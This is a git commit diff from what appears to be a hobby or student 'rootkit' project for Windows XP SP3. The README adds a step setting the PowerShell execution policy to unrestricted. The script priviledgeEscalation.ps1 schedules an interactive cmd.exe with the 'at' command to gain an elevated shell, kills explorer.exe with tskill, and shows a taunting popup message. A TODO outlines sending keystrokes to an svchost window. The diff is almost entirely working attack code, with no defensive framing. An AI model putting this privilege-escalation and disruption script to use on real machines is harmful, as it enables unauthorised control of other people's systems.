3842570e585a5b16f170adb9584cd27e626e436d
Michael Jereza <35281729+MichaelJereza@users.noreply.github.com>
2021-01-16 04:46:57 -0800

    Rootkit kills explorer and provides popup message

--- rootkit/README.txt
+++ rootkit/README.txt
@@ -6,3 +6,6 @@ Windows XP SP3 does not include PowerShell 2.0 by default. Follow these steps to
 
 1. Install "NetFx20SP1_x86.exe" first. This is the Microsoft .NET Framework 2.0 Service Pack 1 which is required to install PowerShell 2.0.
 2. Install "windowsxp-kb968930-x86-eng_540d661066953d76a6907b6ee0d1cd4531c1e1c6" second. This is the Windows Management Framework Core that includes PowerShell 2.0.
+
+PowerShell requires you to set the execution policy before running any scripts:
+`powersehll set-executionpolicy unrestricted` 
--- rootkit/priviledgeEscalation.ps1
+++ rootkit/priviledgeEscalation.ps1
@@ -1,13 +1,25 @@
+#Fetch the process id and session id from explorer in the process list
+$explorerProcess = (get-process -Name explorer)
+$procid = $explorerProcess.id
+$sessionid = $explorerProcess.SessionID
+
 #Create variable with current time + one minute
-$time = (Get-Date).AddMinutes(1).ToString('HH:mm') #Perhaps change to "AddSeconds" to optimize performance
+# $time = (Get-Date).AddMinutes(1).ToString('HH:mm') #Perhaps change to "AddSeconds" to optimize performance
+$time = (Get-Date).AddSeconds(5).ToString('HH:mm:ss')
+
+# Temporary popup message
+$popup = msg $sessionID "Nothing personal, kid..."
 
 #Schedule Command Prompt to open at $time
 at $time /interactive cmd.exe
 
 #Kill Windows Explorer without automatically opening again
-taskkill /F /IM explorer.exe
+# taskkill /F /IM explorer.exe
+# We don't have access to taskkill, since we don't have professional edition
+# Explorer still opens after being killed with tskill
+# Perhaps https://superuser.com/questions/511914/why-does-explorer-restart-automatically-when-i-kill-it-with-process-kill
+tskill $procid
+
 
 #TODO
 #Send keystrokes to "svchost.exe" window to open explorer.exe
-
-
